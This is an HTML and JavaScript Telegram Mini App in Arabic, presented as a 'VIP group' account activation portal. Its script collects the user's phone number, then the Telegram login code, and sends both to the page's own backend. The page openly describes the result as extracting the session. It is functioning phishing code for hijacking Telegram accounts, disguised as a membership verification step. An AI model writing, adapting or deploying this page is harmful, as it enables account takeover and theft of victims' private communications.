<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بوابة التفعيل | Telegram Mini App</title>
  <!-- مكتبة تيليغرام الرسمية للـ Mini Apps -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
    body {
      background-color: var(--tg-theme-bg-color, #17212b);
      color: var(--tg-theme-text-color, #ffffff);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .card {
      background-color: var(--tg-theme-secondary-bg-color, #1e2c3a);
      border: 1px solid #2a3d52;
      padding: 25px;
      border-radius: 20px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    .vip-badge {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #fff;
      padding: 5px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 700;
      display: inline-block;
      margin-bottom: 15px;
    }
    h2 { margin: 5px 0 10px; font-size: 22px; }
    p { color: #93c5fd; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: 2px solid #364353;
      background: #0f172a;
      color: #fff;
      font-size: 18px;
      text-align: center;
      outline: none;
    }
    input:focus { border-color: var(--tg-theme-button-color, #3b82f6); }
    button {
      background-color: var(--tg-theme-button-color, #2481cc);
      color: var(--tg-theme-button-text-color, #ffffff);
      border: none;
      padding: 14px;
      border-radius: 10px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      transition: opacity 0.2s;
    }
    button:active { opacity: 0.8; }
    #codeSection { display: none; }
  </style>
</head>
<body>

  <div class="card">
    <div class="vip-badge">🌟 بوت مجموعة VIP</div>
    <h2 id="title">تفعيل الحساب</h2>
    <p id="statusDesc">أدخل رقم هاتفك المرتبط بتيليغرام لمتابعة عملية التوثيق.</p>

    <!-- خانة رقم الهاتف -->
    <div id="phoneSection">
      <input type="text" id="phoneInput" placeholder="+9639xxxxxxxx">
      <button onclick="sendCode()">إرسال رمز التفعيل</button>
    </div>

    <!-- خانة الرمز -->
    <div id="codeSection">
      <input type="text" id="codeInputs" placeholder="أدخل الرمز الواصل" maxlength="10">
      <button onclick="verifyCode()">تأكيد الرمز واستخراج الجلسة</button>
    </div>
  </div>

  <script>
    // تهيئة تطبيق تيليغرام المصغر والتنسيق التلقائي مع ثيم التطبيق (داكن/فاتح)
    window.Telegram.WebApp.ready();
    const tg = window.Telegram.WebApp;
    tg.expand(); // توسيع التطبيق لملء الشاشة

    let globalPhone = "";

    async function sendCode() {
      const phone = document.getElementById('phoneInput').value.trim();
      if (!phone) {
        alert('الرجاء إدخال رقم الهاتف مع رمز الدولة');
        return;
      }
      globalPhone = phone;

      const btn = event.target;
      btn.innerText = "جاري الإرسال...";
      btn.disabled = true;

      try {
        const response = await fetch('/api/send-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: jsonString = JSON.stringify({ phone })
        });
        const result = await response.json();

        if (result.success) {
          document.getElementById('title').innerText = "أدخل رمز التحقق";
          document.getElementById('statusDesc').innerText = "تم إرسال الرمز عبر تيليغرام إلى الرقم: " + phone;
          document.getElementById('phoneSection').style.display = 'none';
          document.getElementById('codeSection').style.display = 'block';
        } else {
          alert('خطأ: ' + result.error);
          btn.innerText = "إرسال رمز التفعيل";
          btn.disabled = false;
        }
      } catch (err) {
        alert('تعذر الاتصال بالسيرفر.');
        btn.innerText = "إرسال رمز التفعيل";
        btn.disabled = false;
      }
    }

    async function verifyCode() {
      const code = document.getElementById('codeInputs').value.trim();
      if (!code) {
        alert('الرجاء إدخال الرمز');
        return;
      }

      try {
        const response = await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: globalPhone,
            phoneCode: code
          })
        });

        const result = await response.json();
        if (result.success) {
          tg.showAlert('🎉 مبروك! تم التحقق بنجاح واستخراج الجلسة.');
          document.getElementById('title').innerText = "تم التفعيل بنجاح!";
          document.getElementById('statusDesc').innerText = "تم ربط الحساب وتأكيد العضوية.";
          document.getElementById('codeSection').style.display = 'none';
        } else {
          alert('خطأ: ' + result.error);
        }
      } catch (err) {
        alert('حدث خطأ أثناء التأكيد.');
      }
    }
  </script>
</body>
</html>
